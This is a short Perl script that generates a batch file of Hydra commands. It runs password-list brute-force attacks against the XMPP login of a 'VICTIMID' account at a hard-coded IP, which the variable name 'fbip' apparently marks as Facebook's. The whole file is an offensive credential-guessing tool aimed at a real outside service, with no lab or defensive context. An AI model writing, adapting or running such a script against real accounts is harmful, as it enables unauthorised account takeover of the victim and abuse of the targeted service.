#!/usr/bin/env/perl

my $w;

print "Hydra create start batch...\n\n";
my $l = "VICTIMID";
open F, ">start_hydra_.bat";
foreach (glob('*')) {
next if ($_ !~ /\.txt/ig);
	my $fbip = "31.13.85.36";
	my $mod = "xmpp";
	$w = $_;
	print F ("hydra -l $l -P $_ $fbip $mod\n");
}

close(F);
